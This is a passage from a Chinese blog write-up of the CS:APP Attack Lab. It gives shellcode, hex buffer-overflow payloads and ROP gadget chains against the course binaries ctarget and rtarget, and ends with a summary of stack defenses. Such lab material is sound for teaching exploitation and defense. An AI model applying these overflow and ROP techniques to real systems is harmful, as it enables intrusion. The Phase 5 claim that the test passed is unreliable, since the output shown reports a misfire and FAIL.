+<p>可以跟第二步一样，先确认注入的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $0x5561dca8, %rdi</span><br><span class="line">push $0x4018fa</span><br><span class="line">ret</span><br></pre></td></tr></table></figure></p>
+<p>然后使用gcc和objdump工具来查看其十六进制：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -c phase_3.s </span><br><span class="line">$ objdump -d phase_3.o</span><br></pre></td></tr></table></figure></p>
+<p>得到的结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">phase_3.o:     file format elf64-x86-64</span><br><span class="line">Disassembly of section .text:</span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi</span><br><span class="line">   7:	68 fa 18 40 00       	pushq  $0x4018fa</span><br><span class="line">   c:	c3                   	retq</span><br></pre></td></tr></table></figure></p>
+<p>所以我们可以构造字符串如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68</span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61 </span><br><span class="line">00</span><br></pre></td></tr></table></figure></p>
+<p>写入一个文件中，然后使用工具hex2raw来生成我们最终要的字符串，不赘述。</p>
+<p>最终测试通过。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ./hex2raw -i phase_3.txt &gt; phase_3_r.txt</span><br><span class="line">$ ./ctarget -q &lt; phase_3_r.txt </span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(&quot;59b997fa&quot;)</span><br><span class="line">Valid solution for level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure></p>
+<h3 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase 4"></a>Phase 4</h3><p>接下来的两步是关于ROP（Return-Oriented Programming）攻击的例子。在程序rtarget中使用两种方法来防范普通的缓冲区溢出攻击：</p>
+<ul>
+<li>栈随机化</li>
+<li>限制栈上的代码执行</li>
+</ul>
+<p>可以通过已有的可执行代码来完成我们的重定向操作，这就是我们将要用到的ROP技术，实际上就是使用现在代码中已有的代码片段，这些指令都有一个特点：后面跟着指令ret。如下图所示：</p>
+<p><center><br>  <img src="/uploads/csapp/attacklab/gadget.png" width="60%" height="40%"><br></center><br>每次return都相当于从一个gadget跳转到另一个gadget，这样我们就可以通过构造输入的字符串，使用ROP，通过程序自身的代码片段来构造攻击。<br>现在我们的目标和Phase 2的目标是一样的，传递cookie到函数touch2。</p>
+<p>那么问题来了，如何将cookie传递给寄存器<code>%rdi</code>，最简单的思路上是将cookie存到<code>%rsp</code>的位置，然后弹出，但是没有找到<code>popq %rdi</code>（字节码5f）。但是找到了表示<code>popq %rax</code>的字节码58，代码地址如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:	c3                   	retq</span><br></pre></td></tr></table></figure></p>
+<p>起始地址为0x4019ab，这就是第一个gadget。字节码90表示<code>nop</code>。</p>
+<p>然后将<code>%rax</code>中的值传给<code>%rdi</code>，这一部分的整个步骤如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">popq %rax</span><br><span class="line">movq %rax, %rdi</span><br><span class="line">retq</span><br></pre></td></tr></table></figure></p>
+<p><code>movq %rax, %rdi</code>的字节码为：48 89 c7。继续在反编译的代码中找与该字节码匹配的部分，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:	c3                   	retq</span><br></pre></td></tr></table></figure></p>
+<p>起始地址为：0x4019c5，这是第二个gadget。</p>
+<p>小结一下，构造的输入在栈上的排列如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">|      缓冲区      | &lt;- 栈顶</span><br><span class="line">-------------------</span><br><span class="line">|   gadget1的地址  |</span><br><span class="line">-------------------</span><br><span class="line">|   我的cookie值   |</span><br><span class="line">-------------------</span><br><span class="line">|   gadget2的地址  |</span><br><span class="line">-------------------</span><br><span class="line">|   touch2的地址   | &lt;- 栈底</span><br><span class="line">-------------------</span><br></pre></td></tr></table></figure>
+<p>缓冲区中的内容可以随便填充，除了0x0a。cookie值会由gadget1传给寄存器<code>%rdi</code>，gadget2会返回到函数touch2的地址继续执行。</p>
+<p>所以我们构造的内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure></p>
+<p>测试通过。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ./hex2raw -i phase_4.txt &gt; phase_4_r.txt</span><br><span class="line">$ ./rtarget -q &lt; phase_4_r.txt </span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure></p>
+<h3 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase 5"></a>Phase 5</h3><p>这一步的目标与Phase 3一致，传入cookie构造的字符串给函数touch3，但是这里是用ROP的攻击手段。</p>
+<p>cookie值转换成字符串的ASCII码，与Phase 3一样。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x59b997fa -&gt; 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure></p>
+<p>首先整理一个思路：</p>
+<ol>
+<li>拿到%rsp存着的地址</li>
+<li>把这个地址+cookie在stack偏移量pop到某个寄存器</li>
+<li>然后把这个寄存器的值放到%rdi中</li>
+<li>然后调用到touch3</li>
+<li>cookie要放到stack最后面</li>
+<li>字符串最后加上\0也就是00000000来标志结束<br>然后我们根据我们的需求，在反编译的代码中找到对应的gadget。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">|     填充区1     |     --      |    --    | &lt;- 栈顶</span><br><span class="line">| mov %rsp, %rax | 48 89 e0 c3 | 0x401aad |</span><br><span class="line">| add $0x37, %al |  04 37 c3   | 0x4019d8 |</span><br><span class="line">| mov %rax, %rdi | 48 89 c7 c3 | 0x4019a2 |</span><br><span class="line">|  touch3的地址   |     --      | 0x4018fa |</span><br><span class="line">|     填充区2     |     --      |    --    |</span><br><span class="line">|  cookie字符串   |     --      |    --    | &lt;- 栈底</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>第二个填充区的大小为31字节（0x37 - 3 * 8）。至于为什么是这个值，可以通过模拟栈上的位置来确定。</p>
+<p>我们根据这个构造的文件为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ad 1a 40 00 00 00 00 00</span><br><span class="line">d8 19 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 35</span><br><span class="line">39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure></p>
+<p>测试通过！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./hex2raw -i phase_5.txt &gt; phase_5_r.txt</span><br><span class="line">$ ./rtarget -q &lt; phase_5_r.txt </span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Misfire: You called touch3(&quot;9b997fa&quot;)</span><br><span class="line">FAIL: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:FAIL:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AD 1A 40 00 00 00 00 00 D8 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此，我们便完全通过了所有的攻击。主要是两种：一种是传统的没有加任何堆栈保护的缓冲区溢出漏洞的利用，这种比较简单；另一种是在有一些堆栈保护措施的基础上进行的ROP攻击，这种相对较难。</p>
+<p>我基本上是跟着网上现有的资料和教程跟着走了一遍，主要是为了学习这种方法，其实在学会了方法之后，也能发现，有时候达到目标的途径不止一条，比如ROP的gadget的利用，就不是只有一种方式，如果有余力可以再试试其他的构造方式。</p>
+<p>在这里，可以再回顾一下，针对堆栈的保护措施：</p>
+<ul>
+<li><p>栈随机化：栈随机化的思想使得栈的位置每次运行时都有变化，即使许多机器运行同样的代码，它们栈的地址都是不同的。实现思路是：程序开始时，在栈上分配一段0~n字节之间的随机大小的空间，程序不使用这段空间，但是它会让程序后续执行时栈的位置发生变化。分配的空间要足够大，这样随机化程度高；但是又不能过大，不然会浪费太多空间。这种方法属于一类技术，称为地址空间布局随机化（ASLR），在每次运行程序时，可以保证程序的不同部分会加载到内存不同的区域，每种机器上的地址映射情况大相径庭。</p>
+</li>
+<li><p>栈破坏检测：该方法的思想是：栈帧中任何局部缓冲区与栈状态之间存储一个特殊的金丝雀（canary）值，该值每次在程序执行的时候随机生成，攻击者不容易知道它是什么，在回复寄存器状态和从函数返回之前，程序会先检查这个值有没有变化，如果有变化，程序异常终止。</p>
+</li>
+<li><p>限制可执行代码的区域：这种方法的思路是限制能执行代码的内存区域，这样可以让攻击者无法向系统中插入可执行的代码。这种方法的实现，主要依赖于操作系统、CPU和编程语言本身的支持。</p>
+</li>
+</ul>
+<p>然而，所有的保护措施都不是百分之百的可以消除攻击，我们已经在实验中看到，即使有堆栈保护机制的存在，我们还是可以使用一些方法（ROP）达到攻击的目的。对于程序员来说，了解更多漏洞产生的本质原因，以及编译器、操作系统等提供的安全机制，有利于开发出安全性和鲁棒性更好的程序。</p>
+<p>最后还有一点感想，像这种寻找安全问题并利用漏洞的工作需要一个清晰的思路，更需要非常多的细心和耐心，有种“在鸡蛋中挑骨头”的意思，这样一个训练题已经挺让人头疼，而实际中如果想找一个程序的安全漏洞与此相比要超出很多数量级，可是基本的原理和思路都相差不多。所以，由简到难，先打好基础，一步一步踏踏实实学下去，迎接更多的挑战吧。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol>
+<li><a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf" target="_blank" rel="noopener">http://csapp.cs.cmu.edu/3e/attacklab.pdf</a></li>
+<li><a href="http://blog.csdn.net/lijun538/article/details/50682387" target="_blank" rel="noopener">http://blog.csdn.net/lijun538/article/details/50682387</a></li>
+<li><a href="http://wdxtub.com/2016/04/16/thick-csapp-lab-3/" target="_blank" rel="noopener">http://wdxtub.com/2016/04/16/thick-csapp-lab-3/</a></li>
+</ol>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/29/Bomblab-Writeup/" rel="next" title="Bomblab-Writeup">
+                <i class="fa fa-chevron-left"></i> Bomblab-Writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/11/29/Android可执行文件分析/" rel="prev" title="Android可执行文件分析">
+                Android可执行文件分析 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="Bathingfox">
+            
+              <p class="site-author-name" itemprop="name">Bathingfox</p>
+              <p class="site-description motion-element" itemprop="description">我就是我，是颜色不一样的吃货！！！</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">8</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                    
+                      
+                    
+                    <span class="site-state-item-count">1</span>
+                    <span class="site-state-item-name">categories</span>
+                  
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">2</span>
+                    <span class="site-state-item-name">tags</span>
+                  
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#预备知识"><span class="nav-number">1.</span> <span class="nav-text">预备知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#缓冲区溢出"><span class="nav-number">2.</span> <span class="nav-text">缓冲区溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Attack-Lab"><span class="nav-number">3.</span> <span class="nav-text">Attack Lab</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#准备工作"><span class="nav-number">3.1.</span> <span class="nav-text">准备工作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Phase-1"><span class="nav-number">3.2.</span> <span class="nav-text">Phase 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Phase-2"><span class="nav-number">3.3.</span> <span class="nav-text">Phase 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Phase-3"><span class="nav-number">3.4.</span> <span class="nav-text">Phase 3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Phase-4"><span class="nav-number">3.5.</span> <span class="nav-text">Phase 4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Phase-5"><span class="nav-number">3.6.</span> <span class="nav-text">Phase 5</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考资料"><span class="nav-number">5.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bathingfox</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v6.5.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.5.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.5.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.5.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.5.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.5.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
